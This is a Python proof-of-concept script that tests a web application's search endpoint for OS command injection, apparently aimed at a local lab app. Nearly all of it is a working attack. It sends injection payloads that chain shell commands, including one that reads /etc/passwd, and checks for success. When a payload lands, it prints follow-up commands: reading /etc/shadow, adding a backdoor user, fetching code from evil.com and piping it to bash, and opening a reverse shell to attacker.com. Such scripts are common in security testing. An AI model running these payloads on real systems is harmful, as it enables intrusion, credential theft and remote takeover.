#!/usr/bin/env python3

import requests
import sys
import re

def command_injection_poc(base_url):
    print("\n[*] Command Injection Proof of Concept")
    print("[*] This PoC demonstrates OS command injection via the search function")
    
    # The vulnerable endpoint
    search_url = f"{base_url}/search"
    
    # First, try a normal search to confirm the functionality works
    print("\n[+] Performing normal search...")
    normal_params = {"q": "sample"}
    
    response = requests.get(search_url, params=normal_params)
    if "Results:" in response.text:
        print("[+] Normal search functionality confirmed")
        
        # Extract and display normal results
        results_match = re.search(r'<h2>Results:</h2>\s*<ul>\s*(.+?)\s*</ul>', response.text, re.DOTALL)
        if results_match:
            results = re.findall(r'<li>(.+?)</li>', results_match.group(1))
            print("[+] Normal search results:")
            for result in results:
                print(f"    {result}")
    else:
        print("[-] Normal search functionality not working as expected")
    
    # Now try command injection
    print("\n[+] Attempting command injection...")
    
    # Test different payloads
    payloads = [
        "test; ls -la",           # List files in the current directory
        "test && whoami",         # Show current user
        "test | cat /etc/passwd", # Try to read /etc/passwd
        "test `id`",              # Execute id command
        "test $(uname -a)"        # Execute uname command
    ]
    
    for payload in payloads:
        print(f"\n[+] Trying payload: {payload}")
        injection_params = {"q": payload}
        
        response = requests.get(search_url, params=injection_params)
        
        # Look for signs of successful command injection
        if any(indicator in response.text for indicator in ["total", "drwx", "root:", "uid=", "Linux"]):
            print("[!] COMMAND INJECTION SUCCESSFUL!")
            
            # Extract and display the results
            results_match = re.search(r'<h2>Results:</h2>\s*<ul>\s*(.+?)\s*</ul>', response.text, re.DOTALL)
            if results_match:
                results = re.findall(r'<li>(.+?)</li>', results_match.group(1))
                print("[+] Command output:")
                for result in results:
                    print(f"    {result}")
                    
                # If we found a successful payload, demonstrate more targeted attacks
                if "total" in response.text or "uid=" in response.text:
                    print("\n[+] Now that we've confirmed command injection, we can try more targeted commands")
                    print("[+] For example, we could:")
                    print("    1. Read sensitive files: test; cat /etc/shadow")
                    print("    2. Add a backdoor user: test; useradd -m hacker")
                    print("    3. Download and execute malware: test; curl -s http://evil.com/backdoor | bash")
                    print("    4. Establish a reverse shell: test; bash -i >& /dev/tcp/attacker.com/4444 0>&1")
                    
                    # Note: We don't actually execute these commands in the PoC for safety reasons
                    
                # Break after finding a successful payload
                break
        else:
            print("[-] This payload did not trigger command injection")
    else:
        print("\n[-] Command injection attempts failed - target might be patched")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    command_injection_poc(base_url)